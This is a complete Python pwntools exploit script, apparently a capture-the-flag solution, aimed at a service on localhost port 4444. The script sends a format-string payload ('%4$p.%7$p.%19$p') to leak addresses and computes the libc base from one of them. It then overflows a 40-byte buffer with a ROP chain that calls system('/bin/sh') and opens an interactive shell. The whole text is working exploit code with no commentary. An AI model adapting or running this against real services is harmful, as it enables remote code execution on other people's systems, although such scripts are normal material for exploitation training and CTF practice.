#!/usr/bin/env python3
from pwn import *

"""

"""

context.terminal = ["tmux", "new-window"]

libc = ELF("./libc.so.6")

context.arch = "amd64"
io = None

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val): info(name+" = %#x" % val)
def sla(delim, line): return io.sendlineafter(delim, line)
def sl(line): return io.sendline(line)
def rcu(delim): return io.recvuntil(delim)
def rcv(number): return io.recv(number)
def rcvl(): return io.recvline()


def conn():
    global io
    io = remote("127.0.0.1", 4444)
    return io


conn()

sla(b"Name : \n",b"%4$p.%7$p.%19$p")
leaks = rcvl().split(b".")

print(leaks)

buf = b"A"*(40)

libc_leak = int(leaks[-1].split(b"Descri")[0],16)
print(hex(libc_leak))

libc.address = libc_leak - 0x2724a
logbase()

bin_sh = next(libc.search(b'/bin/sh'))

rop = ROP(libc)
rop.system(bin_sh)

sl(buf + p64(rop.find_gadget(['ret']).address) + rop.chain())

io.interactive()
